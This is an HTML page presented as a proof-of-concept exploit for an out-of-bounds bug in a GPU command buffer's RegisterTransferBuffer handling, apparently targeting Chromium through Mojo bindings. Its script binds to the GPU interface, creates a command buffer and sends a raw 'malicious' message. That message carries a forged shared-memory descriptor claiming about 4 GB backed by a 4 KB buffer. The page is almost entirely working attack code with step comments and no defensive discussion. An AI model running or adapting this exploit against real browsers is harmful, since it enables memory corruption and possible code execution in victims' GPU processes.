<!DOCTYPE html>
<html>
<head>
    <title>RegisterTransferBuffer OOB PoC</title>
</head>
<body>
    <h1>GPU RCE PoC</h1>
    <p id="status">Starting...</p>
    <script>
    (async function() {
        const status = (msg) => {
            document.getElementById('status').innerText = msg;
            console.log(msg);
        };
        try {
            // 1. Get the renderer's interface provider (a Mojo handle)
            const provider = Mojo.getInterfaceProvider();

            // 2. Bind to the GPU interface using that provider
            let gpuHandle, gpu;
            try {
                gpuHandle = Mojo.bindInterface('viz.mojom.Gpu', provider);
                gpu = new viz.mojom.GpuPtr(gpuHandle);
                status('Bound to viz.mojom.Gpu');
            } catch (e) {
                gpuHandle = Mojo.bindInterface('gpu.mojom.GpuChannel', provider);
                gpu = new gpu.mojom.GpuChannelPtr(gpuHandle);
                status('Bound to gpu.mojom.GpuChannel');
            }

            // 3. Create a message pipe for the CommandBuffer and its client
            const {handle0: cmdBufferHandle, handle1: cmdBufferServer} = Mojo.createMessagePipe();
            const {handle0: clientHandle, handle1: clientServer} = Mojo.createMessagePipe();

            // 4. Create a small shared buffer for the shared state
            const sharedState = Mojo.createSharedBuffer(4096);

            // 5. Build the CreateCommandBufferParams
            const createParams = {
                params: {
                    streamId: 1,
                    routeId: 1
                },
                sharedState: sharedState.handle,
                receiver: cmdBufferServer,
                client: clientServer
            };

            // 6. Request a new CommandBuffer
            await gpu.createCommandBuffer(createParams);
            status('CommandBuffer created');

            // 7. Wrap the client handle in the generated remote
            const cmdBuffer = new gpu.mojom.CommandBufferPtr(cmdBufferHandle);
            const pipeHandle = cmdBuffer.ptr.getHandle();

            // 8. Craft the malicious RegisterTransferBuffer message (ordinal 4)
            const payload = new ArrayBuffer(256);
            const view = new DataView(payload);

            // RegisterTransferBuffer_Params_Data (24 bytes)
            view.setUint32(0, 24, true);          // struct size
            view.setUint32(4, 0, true);           // version
            view.setInt32(8, 0x1234, true);       // buffer ID (non-zero)
            view.setUint32(12, 0, true);          // padding
            // Pointer to fake SharedMemoryRegion
            view.setBigInt64(16, BigInt(0x40 - 0x10), true);

            // Fake SharedMemoryRegion at offset 0x40
            view.setUint32(0x40, 24, true);       // struct size
            view.setUint32(0x44, 0, true);        // version
            view.setUint32(0x48, 0, true);        // handle index (0)
            view.setUint32(0x4C, 0, true);        // padding
            view.setBigUint64(0x50, BigInt(0x100000000), true); // huge size

            // Attach a valid small shared buffer
            const sharedBuffer = Mojo.createSharedBuffer(4096);
            const handles = [sharedBuffer.handle];

            // 9. Send the raw message
            pipeHandle.writeMessage(payload, handles);
            status('Malicious message sent!');
            setInterval(() => {}, 10000);
        } catch (err) {
            status('Error: ' + err.message + ' (see console)');
            console.error(err);
        }
    })();
    </script>
</body>
</html>
